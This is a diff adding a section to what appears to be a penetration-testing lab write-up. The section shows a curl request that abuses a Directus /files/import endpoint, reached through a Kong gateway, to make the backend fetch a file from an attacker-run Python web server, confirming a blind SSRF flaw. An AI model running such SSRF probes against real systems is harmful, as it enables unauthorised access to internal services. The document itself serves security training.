@@ -167,3 +167,35 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ```
 This backend service is vulnerable to SSRF. The user agent on the request is Axios, an HTTP client for Node.js.
+
+Placing a file named `ssrftest` on the attacker's web server, a `POST` request to `/files/import` with the file’s URL triggered a backend request.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.203/ssrftest"}' http://apigateway:8000/files/import
+HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+Content-Length: 102
+Connection: keep-alive
+X-Powered-By: Directus
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Access-Control-Expose-Headers: Content-Range
+ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
+Date: Tue, 29 Jul 2025 00:23:17 GMT
+X-Kong-Upstream-Latency: 166
+X-Kong-Proxy-Latency: 1
+Via: kong/2.2.1
+
+{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$
+```
+Although the server returned a `403 Forbidden` error, Server logs confirmed the server accessed the file and received a `200 OK` response.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.130.135 - - [28/Jul/2025 20:23:17] "GET /ssrftest HTTP/1.1" 200 -
+
+```
+This confirms a **blind SSRF vulnerability**—the backend can make unauthenticated outbound requests, but the response data isn't returned to the attacker.
